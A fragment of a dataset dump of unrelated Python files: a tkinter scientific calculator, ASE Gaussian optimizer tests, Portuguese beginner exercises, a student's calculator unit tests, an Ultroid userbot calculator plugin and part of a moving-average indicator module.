button_delete():\n    global calc_operator\n    text = calc_operator[:-1]\n    calc_operator = text\n    text_input.set(text)\n\n# Function to calculate the factorial of a number\ndef factorial(n):\n    if n==0 or n==1:\n        return 1\n    else:\n        return n*factorial(n-1)\n\ndef fact_func():\n    global calc_operator\n    result = str(factorial(int(calc_operator)))\n    calc_operator = result\n    text_input.set(result)\n\n# Function to calculate trigonometric numbers of an angle\ndef trig_sin():\n    global calc_operator\n    result = str(math.sin(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\ndef trig_cos():\n    global calc_operator\n    result = str(math.cos(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\ndef trig_tan():\n    global calc_operator\n    result = str(math.tan(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\ndef trig_cot():\n    global calc_operator\n    result = str(1/math.tan(math.radians(int(calc_operator))))\n    calc_operator = result\n    text_input.set(result)\n\n# Function to find the square root of a number\ndef square_root():\n    global calc_operator\n    if int(calc_operator)>=0:\n        temp = str(eval(calc_operator+'**(1/2)'))\n        calc_operator = temp\n    else:\n        temp = \"ERROR\"\n    text_input.set(temp)\n\n# Function to find the third root of a number\ndef third_root():\n    global calc_operator\n    if int(calc_operator)>=0:\n        temp = str(eval(calc_operator+'**(1/3)'))\n        calc_operator = temp\n    else:\n        temp = \"ERROR\"\n    text_input.set(temp)\n\n# Function to change the sign of number\ndef sign_change():\n    global calc_operator\n    if calc_operator[0]=='-':\n        temp = calc_operator[1:]\n    else:\n        temp = '-'+calc_operator\n    calc_operator = temp\n    text_input.set(temp)\n\n# Function to calculate the percentage of a number\ndef percent():\n    global calc_operator\n    temp = str(eval(calc_operator+'/100'))\n    calc_operator = temp\n    text_input.set(temp)\n\n# Funtion to find the result of an operation\ndef button_equal():\n    global calc_operator\n    temp_op = str(eval(calc_operator))\n    text_input.set(temp_op)\n    calc_operator = temp_op\n\n'''\nVariables\n'''\nsin, cos, tan = math.sin, math.cos, math.tan\nlog, ln = math.log10, math.log\ne = math.exp\np = math.pi\nE = '*10**'\n\ntk_calc = Tk()\ntk_calc.configure(bg=\"#293C4A\", bd=10)\ntk_calc.title(\"Scientific Calculator\")\n\ncalc_operator = \"\"\ntext_input = StringVar()\n\ntext_display = Entry(tk_calc, font=('sans-serif', 20, 'bold'), textvariable=text_input,\n                     bd=5, insertwidth = 5, bg='#BBB', justify='right').grid(columnspan=5, padx = 10, pady = 15)\n\nbutton_params = {'bd':5, 'fg':'#BBB', 'bg':'#3C3636', 'font':('sans-serif', 20, 'bold')}\nbutton_params_main = {'bd':5, 'fg':'#000', 'bg':'#BBB', 'font':('sans-serif', 20, 'bold')}\n\n'''\nButtons\n'''\n#--1st row--\n# Absolute value of a number\nabs_value = Button(tk_calc, button_params, text='abs',\n                   command=lambda:button_click('abs(')).grid(row=1, column=0, sticky=\"nsew\")\n# Remainder of a division\nmodulo = Button(tk_calc, button_params, text='mod',\n                command=lambda:button_click('%')).grid(row=1, column=1, sticky=\"nsew\")\n# Integer division quotient\nint_div = Button(tk_calc, button_params, text='div',\n                 command=lambda:button_click('//')).grid(row=1, column=2, sticky=\"nsew\")\n# Factorial of a number\nfactorial_button = Button(tk_calc, button_params, text='x!',\n                   command=fact_func).grid(row=1, column=3, sticky=\"nsew\")\n# Euler's number e\neulers_num = Button(tk_calc, button_params, text='e',\n                    command=lambda:button_click(str(math.exp(1)))).grid(row=1, column=4, sticky=\"nsew\")\n\n#--2nd row--\n# Sine of an angle in degrees\nsine = Button(tk_calc, button_params, text='sin',\n             command=trig_sin).grid(row=2, column=0, sticky=\"nsew\")\n# Cosine of an angle in degrees\ncosine = Button(tk_calc, button_params, text='cos',\n             command=trig_cos).grid(row=2, column=1, sticky=\"nsew\")\n# Tangent of an angle in degrees\ntangent = Button(tk_calc, button_params, text='tan',\n             command=trig_tan).grid(row=2, column=2, sticky=\"nsew\")\n# Cotangent of an angle in degrees\ncotangent = Button(tk_calc, button_params, text='cot',\n             command=trig_cot).grid(row=2, column=3, sticky=\"nsew\")\n# Pi(3.14...) number\npi_num = Button(tk_calc, button_params, text='\u00cf\u20ac',\n                command=lambda:button_click(str(math.pi))).grid(row=2, column=4, sticky=\"nsew\")\n\n#--3rd row--\n# Power of 2\nsecond_power = Button(tk_calc, button_params, text='x\\u00B2',\n             command=lambda:button_click('**2')).grid(row=3, column=0, sticky=\"nsew\")\n# Power of 3\nthird_power = Button(tk_calc, button_params, text='x\\u00B3',\n             command=lambda:button_click('**3')).grid(row=3, column=1, sticky=\"nsew\")\n# Power of n\nnth_power = Button(tk_calc, button_params, text='x^n',\n             command=lambda:button_click('**')).grid(row=3, column=2, sticky=\"nsew\")\n# Inverse number\ninv_power = Button(tk_calc, button_params, text='x\\u207b\\xb9',\n             command=lambda:button_click('**(-1)')).grid(row=3, column=3, sticky=\"nsew\")\n# Powers of 10\ntens_powers = Button(tk_calc, button_params, text='10^x', font=('sans-serif', 15, 'bold'),\n                     command=lambda:button_click('10**')).grid(row=3, column=4, sticky=\"nsew\")\n\n#--4th row--\n# Square root of a number\nsquare_root = Button(tk_calc, button_params, text='\\u00B2\\u221A',\n                     command=square_root).grid(row=4, column=0, sticky=\"nsew\")\n# Third root of a number\nthird_root = Button(tk_calc, button_params, text='\\u00B3\\u221A',\n                    command=third_root).grid(row=4, column=1, sticky=\"nsew\")\n# nth root of a number\nnth_root = Button(tk_calc, button_params, text='\\u221A',\n                  command=lambda:button_click('**(1/')).grid(row=4, column=2, sticky=\"nsew\")\n# Logarithm of a number with base 10\nlog_base10 = Button(tk_calc, button_params, text='log\\u2081\\u2080', font=('sans-serif', 16, 'bold'),\n                   command=lambda:button_click('log(')).grid(row=4, column=3, sticky=\"nsew\")\n# Logarithm of a number with base e (ln)\nlog_basee = Button(tk_calc, button_params, text='ln',\n                   command=lambda:button_click('ln(')).grid(row=4, column=4, sticky=\"nsew\")\n\n#--5th row--\n# Add a left parentheses\nleft_par = Button(tk_calc, button_params, text='(',\n                  command=lambda:button_click('(')).grid(row=5, column=0, sticky=\"nsew\")\n# Add a right parentheses\nright_par = Button(tk_calc, button_params, text=')',\n                   command=lambda:button_click(')')).grid(row=5, column=1, sticky=\"nsew\")\n# Change the sign of a number\nsigns = Button(tk_calc, button_params, text='\\u00B1',\n               command=sign_change).grid(row=5, column=2, sticky=\"nsew\")\n# Transform number to percentage\npercentage = Button(tk_calc, button_params, text='%',\n               command=percent).grid(row=5, column=3, sticky=\"nsew\")\n# Calculate the function e^x\nex = Button(tk_calc, button_params, text='e^x',\n               command=lambda:button_click('e(')).grid(row=5, column=4, sticky=\"nsew\")\n\n#--6th row--\nbutton_7 = Button(tk_calc, button_params_main, text='7',\n                  command=lambda:button_click('7')).grid(row=6, column=0, sticky=\"nsew\")\nbutton_8 = Button(tk_calc, button_params_main, text='8',\n                  command=lambda:button_click('8')).grid(row=6, column=1, sticky=\"nsew\")\nbutton_9 = Button(tk_calc, button_params_main, text='9',\n                  command=lambda:button_click('9')).grid(row=6, column=2, sticky=\"nsew\")\ndelete_one = Button(tk_calc, bd=5, fg='#000', font=('sans-serif', 20, 'bold'),\n              text='DEL', command=button_delete, bg='#db701f').grid(row=6, column=3, sticky=\"nsew\")\ndelete_all = Button(tk_calc, bd=5, fg='#000', font=('sans-serif', 20, 'bold'),\n              text='AC', command=button_clear_all, bg='#db701f').grid(row=6, column=4, sticky=\"nsew\")\n\n#--7th row--\nbutton_4 = Button(tk_calc, button_params_main, text='4',\n                  command=lambda:button_click('4')).grid(row=7, column=0, sticky=\"nsew\")\nbutton_5 = Button(tk_calc, button_params_main, text='5',\n                  command=lambda:button_click('5')).grid(row=7, column=1, sticky=\"nsew\")\nbutton_6 = Button(tk_calc, button_params_main, text='6',\n                  command=lambda:button_click('6')).grid(row=7, column=2, sticky=\"nsew\")\nmul = Button(tk_calc, button_params_main, text='*',\n             command=lambda:button_click('*')).grid(row=7, column=3, sticky=\"nsew\")\ndiv = Button(tk_calc, button_params_main, text='/',\n             command=lambda:button_click('/')).grid(row=7, column=4, sticky=\"nsew\")\n\n#--8th row--\nbutton_1 = Button(tk_calc, button_params_main, text='1',\n                  command=lambda:button_click('1')).grid(row=8, column=0, sticky=\"nsew\")\nbutton_2 = Button(tk_calc, button_params_main, text='2',\n                  command=lambda:button_click('2')).grid(row=8, column=1, sticky=\"nsew\")\nbutton_3 = Button(tk_calc, button_params_main, text='3',\n                  command=lambda:button_click('3')).grid(row=8, column=2, sticky=\"nsew\")\nadd = Button(tk_calc, button_params_main, text='+',\n             command=lambda:button_click('+')).grid(row=8, column=3, sticky=\"nsew\")\nsub = Button(tk_calc, button_params_main, text='-',\n             command=lambda:button_click('-')).grid(row=8, column=4, sticky=\"nsew\")\n\n#--9th row--\nbutton_0 = Button(tk_calc, button_params_main, text='0',\n                  command=lambda:button_click('0')).grid(row=9, column=0, sticky=\"nsew\")\npoint = Button(tk_calc, button_params_main, text='.',\n               command=lambda:button_click('.')).grid(row=9, column=1, sticky=\"nsew\")\nexp = Button(tk_calc, button_params_main, text='EXP', font=('sans-serif', 16, 'bold'),\n             command=lambda:button_click(E)).grid(row=9, column=2, sticky=\"nsew\")\nequal = Button(tk_calc, button_params_main, text='=',\n               command=button_equal).grid(row=9, columnspan=2, column=3, sticky=\"nsew\")\n\n\ntk_calc.mainloop() \n", "319": "import pytest\nfrom ase import Atoms\nfrom ase.io import read\nfrom ase.calculators.gaussian import Gaussian, GaussianOptimizer, GaussianIRC\nfrom ase.optimize import LBFGS\n\n\n@pytest.fixture\ndef atoms():\n    return Atoms('CHO',\n                 [[0.0, 0.0, 0.0],\n                  [0.0, 0.0, 1.35],\n                  [1.178513, 0.0, -0.416662]],\n                 magmoms=[0.5, 0.0, 0.5])\n\n\ndef get_calc(**kwargs):\n    kwargs.update(mem='100MW', method='hf', basis='sto-3g')\n    return Gaussian(**kwargs)\n\n\ndef test_optimizer(atoms):\n    pos = atoms.positions.copy()\n    atoms.calc = get_calc(label='opt', scf='qc')\n    opt_gauss = GaussianOptimizer(atoms)\n    opt_gauss.run(fmax='tight')\n    e_gaussopt = read('opt.log', index=-1).get_potential_energy()\n\n    atoms.positions[:] = pos\n    atoms.calc.set_label('sp')\n    with LBFGS(atoms) as opt_ase:\n        opt_ase.run(fmax=1e-2)\n    e_aseopt = atoms.get_potential_energy()\n    assert e_gaussopt - e_aseopt == pytest.approx(0., abs=1e-3)\n\n\ndef test_irc(atoms):\n    calc_ts = get_calc(label='ts', chk='ts.chk')\n    ts = GaussianOptimizer(atoms, calc_ts)\n    ts.run(opt='calcall,ts,noeigentest')\n    tspos = atoms.positions.copy()\n\n    atoms.calc = get_calc(label='sp', chk='sp.chk', freq='')\n    e_ts = atoms.get_potential_energy()\n\n    calc_irc_for = get_calc(label='irc_for', oldchk='sp', chk='irc_for.chk')\n    irc_for = GaussianIRC(atoms, calc_irc_for)\n    irc_for.run(direction='forward', irc='rcfc')\n    e_for = read('irc_for.log', index=-1).get_potential_energy()\n\n    atoms.positions[:] = tspos\n    calc_irc_rev = get_calc(label='irc_rev', oldchk='sp', chk='irc_rev.chk')\n    irc_rev = GaussianIRC(atoms, calc_irc_rev)\n    irc_rev.run(direction='reverse', irc='rcfc')\n    e_rev = read('irc_rev.log', index=-1).get_potential_energy()\n\n    assert e_ts - e_for == pytest.approx(1.282, abs=1e-3)\n    assert e_ts - e_rev == pytest.approx(0.201, abs=1e-3)\n", "320": "# Express\u00f5es alg\u00e9bricas:\n# Escreva as seguintes express\u00f5es alg\u00e9bricas em linguagem Python:\n# a) O somat\u00f3rio dos 5 primeiros n\u00fameros inteiros e positivos\n\nn1 = int(input('Insira o 1\u00aa n\u00famero: '))\nn2 = int(input('Insira o 2\u00aa n\u00famero: '))\nn3 = int(input('Insira o 3\u00aa n\u00famero: '))\nn4 = int(input('Insira o 4\u00ba n\u00famero: '))\nn5 = int(input('Insira o 5\u00aa n\u00famero: '))\ncalc = n1 + n2 + n3 + n4 + n5\n\nprint('O resultado da soma dos n\u00fameros: {}, {}, {}, {} e {} resulta em: {}' .format(n1, n2, n3, n4, n5, calc))\n\n# b) a m\u00e9dia entre 23, 19 e 31\nmedia_calc = (23 + 19 + 31)/3\nprint('A m\u00e9dia de 23, 19 e 31 seria: {}' .format(media_calc))\n\n# c) O n\u00famero de vezes que 73 cabe em 403\ni = 0\nc = 0\n\nwhile i < 403:\n    print(i)\n    i += 73\n    c += 1\n    print(c)\n\nprint('O n\u00famero de vezes que 73 cabe em 403 \u00e9 igual a 403')\n\n#d) A sobra quando 403 \u00e9 dividido por 73:\ncalc = 403 % 73\nprint('O resto da divis\u00e3o de 403 por 73 \u00e9 igual a: {}' .format(calc))\n\n# e) 2 elevado \u00e0 10\u00aa pot\u00eancia:\ncalc = 2**10\nprint('2 elevado a 10\u00aa pot\u00eancia resulta em {}' .format(calc))\n\n# f) O valor absoluto da diferen\u00e7a entre 54 e 57\ncalc = abs(57 - 54)\nprint('O valor absoluto da diferen\u00e7a entre 57 e 54 seria de: {}'. format(calc))\n\n# g) O menor valor entre 34, 29 e 31:\ncalc = min(34, 29, 31)\nprint('O menor valor dentre 34, 29 e 31 seria: {}' .format(calc))\n\n# Atribui\u00e7\u00e3o:\n# Escreva as express\u00f5es em Pyhton para:\n# a) Atribuir o valor inteiro 3 \u00e0 vari\u00e1vel a\na = int(3)\n\n# b) atribuir o valor 4 \u00e0 vari\u00e1vel b\nb = 4\n\n# c) Atribuir \u00e0 vari\u00e1vel c o valor da express\u00e3o a*a + b * b\nc = a * a + b * b\n\n# Strings\n# Execute as seguintes atribui\u00e7\u00f5es:\ns1 = 'ant'\ns2 = 'bat'\ns3 = 'cod'\n\n# Agora, utilizando os operadores + e *, crie as sa\u00eddas a seguir:\nprint(s1 +' ' + s2 + ' '+ s3)\nprint((s1 + ' ') * 10)\nprint(s1 + ' ' + (s2 + ' ') * 2 + (s3 + ' ') * 3)\nprint((s1 + ' ' + s2 + ' ') *7 )\nprint((s2 + s2 + s3 + ' ') * 5)\n\n# Exerc\u00edcio 1\n# Desenvolva um algoritmo que solicite ao usu\u00e1rio o pre\u00e7o de um produto e um percentual de desconto a ser aplicado a ele.\n# Calcule e exiba o valor do desconto e o pre\u00e7o final do produto.\nproduto = str(input('Indique o nome do produto: '))\npreco = float(input('Indique o pre\u00e7o do produto: '))\ndesconto = float(input('Indique o percentual de desconto do produto: '))\ncalc_desc = preco * desconto\ncalc_preco = preco - calc_desc\nprint('O valor do desconto do produto {} foi igual a {}, o valor do produto com desconto \u00e9 de {}' .format(produto, calc_desc, calc_preco))\n\n# Exerc\u00edcio 2\n# Escreva um programa que pergunte a quantidade de km percorridos por um carro alugado pelo usu\u00e1rio, assim como a quantidade de dias pelos quais o carro foi alugado. Calcule o pre\u00e7o a pagar, sabendo que o carro custo R$60 por dia e R$0,15 por km rodado.\nkm_perc = float(input('Insira a quantidade de kilometros percorridos: '))\ndia_alug = float(input('Insira a quantidade de dias alugados: '))\n\ncalc = (dia_alug * 60) + (km_perc * 0.15)\nprint('No total de seu contrato o carro custou: {}' .format(calc))\n\n# Exerc\u00edcio 3\n# Crie uma vari\u00e1vel de string que receba uma frase qualquer. Crie uma segunda vari\u00e1vel, agora contendo a metade da string digitada. Imprima na tela somente os dois \u00faltimos caracteres da segunda vari\u00e1vel do tipo string\n\nstring1 = 'Frase qualquer, s\u00f3 que n\u00e3o'\nlen_st1 = int(len(string1) / 2)\nstring2 = string1[:len_st1]\nlen_st2m2 = len(string2) - 2\nstring3 = string2[len_st2m2:]\nprint('Os dois \u00faltimos caracteres da segunda vari\u00e1vel s\u00e3o: {}' .format(string3))\n\n", "321": "# cs362 - in class activity 03\r\n# casey nord\r\n# spring 2021\r\n\r\n\r\nimport calculator\r\nimport unittest\r\n\r\n\r\nclass CalculatorUnitTests(unittest.TestCase):\r\n\r\n    def test_correct_values_sum(self):\r\n        calc = calculator.Calculator()\r\n        self.assertEqual(calc.sum(1, 1), 2)\r\n        self.assertEqual(calc.sum(5, 6), 11)\r\n        self.assertEqual(calc.sum(5, -6), -1)\r\n    \r\n    def test_correct_values_difference(self):\r\n        calc = calculator.Calculator()\r\n        self.assertEqual(calc.difference(1, 1), 0)\r\n        self.assertEqual(calc.difference(5, 6), -1)\r\n        self.assertEqual(calc.difference(5, -6), 11)\r\n    \r\n    def test_correct_values_multiply(self):\r\n        calc = calculator.Calculator()\r\n        self.assertEqual(calc.multiply(1, 1), 1)\r\n        self.assertEqual(calc.multiply(5, 6), 30)\r\n        self.assertEqual(calc.multiply(5, -6), -30)\r\n\r\n    def test_correct_values_divide(self):\r\n        calc = calculator.Calculator()\r\n        self.assertEqual(calc.divide(1, 1), 1)\r\n        self.assertEqual(calc.divide(30, 6), 5)\r\n        self.assertEqual(calc.divide(30, -6), -5)\r\n\r\n    def test_type(self):\r\n        calc = calculator.Calculator()\r\n        with self.assertRaises(TypeError):\r\n            calc.sum(\"4\", 2)\r\n            calc.difference(\"4\", 2)\r\n            calc.multiply(\"4\", 2)\r\n            calc.divide(\"4\", 2)\r\n\r\n    def test_failing_on_purpose(self):\r\n        # NOTE: this is a terrible practice...\r\n        calc = calculator.Calculator()\r\n        # these are commented out because the test suite *should* pass\r\n        # self.assertEqual(calc.sum(1, 1), 42)\r\n        # self.assertEqual(calc.difference(1, 1), 42)\r\n        # self.assertEqual(calc.multiply(1, 1), 42)\r\n        # self.assertEqual(calc.divide(1, 1), 42)\r\n        # with self.assertRaises(TypeError):\r\n        #     calc.sum(\"4\", \"2\")\r\n\r\n        # it would be okay to write tests that *expect* failing values\r\n        self.assertNotEqual(calc.sum(1, 1), 42)\r\n        self.assertNotEqual(calc.difference(1, 1), 42)\r\n        self.assertNotEqual(calc.multiply(1, 1), 42)\r\n        self.assertNotEqual(calc.divide(1, 1), 42)\r\n\r\n\r\nif __name__ == '__main__':\r\n    unittest.main()\r\n", "322": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "323": "# -*- encoding:utf-8 -*-\n\"\"\"\n    \u79fb\u52a8\u5e73\u5747\u7ebf\uff0cMoving Average\uff0c\u7b80\u79f0MA\uff0c\u539f\u672c\u7684\u610f\u601d\u662f\u79fb\u52a8\u5e73\u5747\uff0c\u7531\u4e8e\u6211\u4eec\u5c06\u5176\u5236\u4f5c\u6210\u7ebf\u5f62\uff0c\u6240\u4ee5\u4e00\u822c\u79f0\u4e4b\u4e3a\u79fb\u52a8\u5e73\u5747\u7ebf\uff0c\u7b80\u79f0\u5747\u7ebf\u3002\n    \u5b83\u662f\u5c06\u67d0\u4e00\u6bb5\u65f6\u95f4\u7684\u6536\u76d8\u4ef7\u4e4b\u548c\u9664\u4ee5\u8be5\u5468\u671f\u3002 \u6bd4\u5982\u65e5\u7ebfMA5\u63075\u5929\u5185\u7684\u6536\u76d8\u4ef7\u9664\u4ee55 \u3002\n    \u79fb\u52a8\u5e73\u5747\u7ebf\u662f\u7531\u8457\u540d\u7684\u7f8e\u56fd\u6295\u8d44\u4e13\u5bb6Joseph E.Granville\uff08\u845b\u5170\u78a7\uff0c\u53c8\u8bd1\u4e3a\u683c\u5170\u5a01\u5c14\uff09\u4e8e20\u4e16\u7eaa\u4e2d\u671f\u63d0\u51fa\u6765\u7684\u3002\n    \u5747\u7ebf\u7406\u8bba\u662f\u5f53\u4eca\u5e94\u7528\u6700\u666e\u904d\u7684\u6280\u672f\u6307\u6807\u4e4b\u4e00\uff0c\u5b83\u5e2e\u52a9\u4ea4\u6613\u8005\u786e\u8ba4\u73b0\u6709\u8d8b\u52bf\u3001\u5224\u65ad\u5c06\u51fa\u73b0\u7684\u8d8b\u52bf\u3001\u53d1\u73b0\u8fc7\u5ea6\u5ef6\u751f\u5373\u5c06\u53cd\u8f6c\u7684\u8d8b\u52bf\n\"\"\"\n\nfrom __future__ import division\nfrom __future__ import absolute_import\nfrom __future__ import print_function\n\nfrom collections import Iterable\n\nimport matplotlib.pyplot as plt\nimport pandas as pd\nfrom enum import Enum\n\nfrom .ABuNDBase import plot_from_order, g_calc_type, ECalcType\nfrom ..CoreBu.ABuPdHelper import pd_rolling_mean, pd_ewm_mean\nfrom ..CoreBu.ABuFixes import six\nfrom ..UtilBu.ABuDTUtil import catch_error\n\n__author__ = '\u963f\u5e03'\n__weixin__ = 'abu_quant'\n\n\nclass EMACalcType(Enum):\n    \"\"\"\u8ba1\u7b97\u79fb\u52a8\u79fb\u52a8\u5e73\u5747\u4f7f\u7528\u7684\u65b9\u6cd5\"\"\"\n    \"\"\"\u7b80\u5355\u79fb\u52a8\u5e73\u5747\u7ebf\"\"\"\n    E_MA_MA = 0\n    \"\"\"\u52a0\u6743\u79fb\u52a8\u5e73\u5747\u7ebf\"\"\"\n    E_MA_EMA = 1\n\n\n# noinspection PyUnresolvedReferences\ndef _calc_ma_from_ta(prices, time_period=10, from_calc=EMACalcType.E_MA_MA):\n    \"\"\"\n    \u4f7f\u7528talib\u8ba1\u7b97ma\uff0c\u5373\u900f\u4f20talib.MA or talib.EMA\u8ba1\u7b97\u7ed3\u679c\n    :param prices: \u6536\u76d8\u4ef7\u683c\u5e8f\u5217\uff0cpd.Series\u6216\u8005np.array\n    :param time_period: \u79fb\u52a8\u5e73\u5747\u7684N\u503c\uff0cint\n    :param from_calc: EMACalcType enum\u5bf9\u8c61\uff0c\u79fb\u52a8\u79fb\u52a8\u5e73\u5747\u4f7f\u7528\u7684\u65b9\u6cd5\n    \"\"\"\n\n    import talib\n    if isinstance(prices, pd.Series):\n        prices = prices.values\n\n    if from_calc == EMACalcType.E_MA_MA:\n        ma = talib.MA(prices, timeperiod=time_period)\n    else:\n        ma = talib.EMA(prices, timeperiod=time_period)\n    return ma\n\n\ndef _calc_ma_from_pd(prices, time_period=10, from_calc=EMACalcType.E_MA_MA):\n    \"\"\"\n    \u901a\u8fc7pandas\u8ba1\u7b97ma\u6216\u8005ema\n    :param prices: \u6536\u76d8\u4ef7\u683c\u5e8f\u5217\uff0cpd.Series\u6216\u8005np.array\n    :param time_period: \u79fb\u52a8\u5e73\u5747\u7684N\u503c\uff0cint\n    :param from_calc: EMACalcType enum\u5bf9\u8c61\uff0c\u79fb\u52a8\u79fb\u52a8\u5e73\u5747\u4f7f\u7528\u7684\u65b9\u6cd5\n    \"\"\"\n\n    if isinstance(prices, pd.Series):\n        prices = prices.values\n\n    if from_calc == EMACalcType.E_MA_MA:\n        ma = pd_rolling_mean(prices, window=time_period, min_periods=time_period)\n    else:\n        ma = pd_ewm_mean(prices, span=time_period, min_periods=time_period)\n    return ma\n\n\ndef calc_ma_from_prices(prices, time_period=10, min_periods=None, from_calc=EMACalcType.E_MA_MA):\n    \"\"\"\n    \u901a\u8fc7pandas\u8ba1\u7b97ma\u6216\u8005ema, \u6dfb\u52a0min_periods\u53c2\u6570\n    :param prices: \u6536\u76d8\u4ef7\u683c\u5e8f\u5217\uff0cpd.Series\u6216\u8005np.array\n    :param time_period: \u79fb\u52a8\u5e73\u5747\u7684N\u503c\uff0cint\n    :param min_periods: int\uff0c\u9ed8\u8ba4None\u5219\u4f7f\u7528time_period\n    :param from_calc: EMACalcType enum\u5bf9\u8c61\uff0c\u79fb\u52a8\u79fb\u52a8\u5e73\u5747\u4f7f\u7528\u7684\u65b9\u6cd5\n    \"\"\"\n\n    if isinstance(prices, pd.Series):\n        prices = prices.values\n\n    min_periods = time_period if min_periods is None else min_periods\n    if from_calc == EMACalcType.E_MA_MA:\n        ma = pd_rolling_mean(prices, window=time_period, min_periods=min_periods)\n    else:\n        ma = pd_ewm_mean(prices, span=time_period, min_periods=min_periods)\n    return ma\n\n\n\"\"\"\u901a\u8fc7\u5728ABuNDBase\u4e2d\u5c1d\u8bd5import talib\u6765\u7edf\u4e00\u786e\u5b9a\u6307\u6807\u8ba1\u7b97\u65b9\u5f0f, \u5916\u90e8\u8ba1\u7b97\u53ea\u5e94\u8be5\u4f7f\u7528calc_ma\"\"\"\ncalc_ma = _calc_ma_from_pd if g_calc_type == ECalcType.E_FROM_PD else _calc_ma_from_ta\n\n\ndef plot_ma_from_order(order, date_ext=120, **kwargs):\n    \"\"\"\n    \u5c01\u88c5ABuNDBase\u4e2d\u7684plot_from_order\u4e0e\u6a21\u5757\u4e2d\u7ed8\u5236\u6280\u672f\u6307\u6807\u7684\u51fd\u6570\uff0c\u5b8c\u6210\u6280\u672f\u6307\u6807\u53ef\u89c6\u5316\u53ca\u6807\u6ce8\u4e70\u5165\u5356\u51fa\u70b9\u4f4d\n    :param order: AbuOrder\u5bf9\u8c61\u8f6c\u6362\u7684pd.DataFrame\u5bf9\u8c61or pd.Series\u5bf9\u8c61\n    :param date_ext: int\u5bf9\u8c61 eg. \u5982\u4ea4\u6613\u57282015-06-01\u6267\u884c\uff0c\u5982date_ext\uff1d120\uff0c\u62e9start\u5411\u524d\u63a8120\u5929\uff0cend\u5411\u540e\u63a8120\u5929\n    :param kwargs: \u7ed8\u5236\u6280\u672f\u6307\u6807\u9700\u8981\u7684\u5176\u5b83\u5173\u952e\u5b57\u53c2\u6570\uff0ctime_period\uff0cfrom_calc, with_price\uff0c\u6700\u7ec8\u900f\u4f20\u7ed9plot_ma\n    \"\"\"\n    return plot_from_order(plot_ma_from_klpd, order, date_ext, **kwargs)\n\n\ndef plot_ma_from_klpd(kl_pd, with_points=None, with_points_ext=None, **kwargs):\n    \"\"\"\n    \u5c01\u88c5plot_ma\uff0c\u7ed8\u5236\u6536\u76d8\u4ef7\u683c\uff0c\u4ee5\u53ca\u591a\u6761\u79fb\u52a8\u5747\u7ebf\n    :param kl_pd: \u91d1\u878d\u65f6\u95f4\u5e8f\u5217\uff0cpd.DataFrame\u5bf9\u8c61\n    :param with_points: \u8fd9\u91cc\u7684\u5e38\u89c4\u7528\u9014\u662f\u4f20\u5165\u4e70\u5165order, with_points=buy_index=pd.to_datetime(orders['buy_date']))\n    :param with_points_ext: 